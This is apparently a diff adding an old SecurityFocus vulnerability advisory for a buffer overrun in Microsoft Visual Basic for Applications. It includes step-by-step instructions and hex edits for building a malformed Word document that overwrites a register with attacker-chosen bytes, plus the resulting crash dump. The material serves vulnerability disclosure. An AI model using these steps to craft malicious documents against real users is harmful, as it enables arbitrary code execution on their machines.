@@ -1,0 +1,48 @@
+source: http://www.securityfocus.com/bid/8534/info
+
+A vulnerability has been discovered in Microsoft Visual Basic for Applications. The vulnerability occurs because the software fails to perform sufficient boundary checks when parsing specific properties of malformed documents. As a result, a malformed document may trigger a buffer overrun within the affected application, effectively allowing arbitrary code to run.
+
+Internet Explorer is also reportedly an attack vector, since it may call helper applications when handling certain document types. 
+
+1. Open Word.
+2. Select "Insert" - "Object"
+3. Select "MSPropertyTreeCtl Class" (You can also select other objects such
+as ChoiceBox Class, etc)
+4. Save .doc file.
+5. Modify .doc file by using binary editor as follows:
+
+5a. Find following strings in doc file.
+
+ID="{1FE45957-2625-4B1E-ADEF-EC04B7F34CCF}"
+Document=ThisDocument/&H00000000
+Name="Project"
+HelpContextID="0"
+VersionCompatible32="393222000"
+CMG="1E1C0125015D1B611B611B611B61"
+DPB="4B4954458046804680"
+GC="787A679868986867"
+
+5b. Change "ID" from:
+
++0000 49 44 3D 22 7B 31 46 45 34 35 39 35 37 2D 32 36 ID="{1FE45957-26
++0010 32 35 2D 34 42 31 45 2D 41 44 45 46 2D 45 43 30 25-4B1E-ADEF-EC0
++0020 34 42 37 46 33 34 43 43 46 7D 22 0D 0A 44 6F 63 4B7F34CCF}"..Doc
++0030 75 6D 65 6E 74 3D 54 68 69 73 44 6F 63 75 6D 65 ument=ThisDocume
+
+to the following:
+
++0000 49 44 3D 22 7B 61 61 61 61 61 61 61 61 61 61 61 ID="{aaaaaaaaaaa
++0010 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa
++0020 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa
++0030 61 61 61 61 41 42 43 44 00 00 00 00 aaaaABCD....
+
+6. Open modified doc file.
+7. You'll be able to see an access violation such as...
+
+65106055 FF 52 0C call dword ptr [edx+0Ch]
+
+EAX = 023219A4 EBX = 0232194B ECX = 02311AC4
+EDX = 44434241 ESI = 0231186C EDI = 02321940
+EIP = 65106055 ESP = 0012CBA0 EBP = 0012CBB8
+
+**UPDATE: Core Security Technologies has developed a working commercial exploit for its CORE IMPACT product. This exploit is not otherwise publicly available or known to be circulating in the wild. 
